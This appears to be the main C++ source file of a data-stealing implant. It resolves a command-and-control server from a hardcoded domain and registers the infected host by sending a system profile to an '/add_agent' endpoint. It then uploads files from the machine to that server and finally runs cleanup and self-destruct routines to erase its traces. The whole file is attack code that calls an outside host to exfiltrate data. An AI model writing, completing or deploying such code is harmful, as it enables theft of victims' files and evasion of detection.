#include "Core/upload.hpp"
#include "Core/self_destruct.hpp"
#include "Core/profiler.hpp"
#include "Communication/google_resolve.hpp"
#include "Communication/c2_resolve.hpp"
#include "Communication/addagent.hpp"



constexpr bool ONETIMERUN = true;
std::vector<std::wstring> URLS = {L"https://hudsonmart.shop"};


void CleanupAndDestroy() {
    std::cout << "Beginning cleanup..." << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(5));
    Cleanup();
    std::this_thread::sleep_for(std::chrono::seconds(3));
    SelfDestruct();
}


int main() {
    // Mode 1: run once and then > cleanup > self destruct
    if (ONETIMERUN) { 
        bool ReachIntranet = googleConn(); 
        if (ReachIntranet) { 
            std::wstring C2 = C2Conn(URLS); 
            if (!C2.empty()) {
                std::wstring PC2 = C2 + L"/add_agent";
                nlohmann::json JsonProfile = Profiler(); 
                std::string response = SendProfile(PC2, JsonProfile);
                auto jsonResp = nlohmann::json::parse(response);
                if (jsonResp.contains("message") && jsonResp["message"] == "created") {
                    std::cout << "Running file upload" << std::endl;
                    ProcessFilesAndUpload(C2);
                }
            }
        }
        CleanupAndDestroy(); 
    }

    // This code might never see the light of the day but I gonna keep here anyways...
    CleanupAndDestroy(); 
    

    return 0;
}

